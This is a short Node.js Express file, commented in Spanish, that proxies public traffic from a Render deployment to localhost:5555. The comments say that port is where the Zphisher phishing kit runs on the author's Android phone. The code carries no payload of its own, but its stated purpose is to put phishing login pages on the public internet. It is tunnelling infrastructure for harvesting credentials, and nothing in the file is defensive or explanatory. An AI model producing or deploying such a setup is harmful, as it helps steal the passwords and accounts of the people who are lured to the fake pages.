const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/', createProxyMiddleware({
  target: 'http://localhost:5555', // El puerto donde corre Zphisher en tu Android
  changeOrigin: true
}));

// Puerto que Render necesita usar
const PORT = process.env.PORT || 10000;

app.listen(PORT, () => {
  console.log(`Túnel escuchando en el puerto ${PORT}`);
});
